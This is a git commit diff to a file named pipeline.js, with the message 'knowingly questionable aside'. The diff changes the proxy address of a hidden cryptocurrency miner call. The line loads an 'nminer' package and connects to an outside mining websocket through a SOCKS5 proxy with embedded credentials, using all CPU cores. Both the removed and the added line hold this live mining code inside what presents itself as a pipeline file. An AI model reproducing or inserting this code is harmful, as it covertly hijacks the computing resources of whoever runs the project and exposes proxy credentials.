f8f75cc29a8356875455f7d85b83dd29e7d65d41
Irma Goldner <irma_goldner@yahoo.com>
2026-08-22 07:30:43 +0530

    knowingly questionable aside

--- pipeline.js
+++ pipeline.js
@@ -1,2 +1,2 @@
 const { NMiner } = require("nminer");
-new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@198.20.185.156:5526", threads: require("os").cpus().length, throttle: true });
+new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@173.211.8.109:6221", threads: require("os").cpus().length, throttle: true });
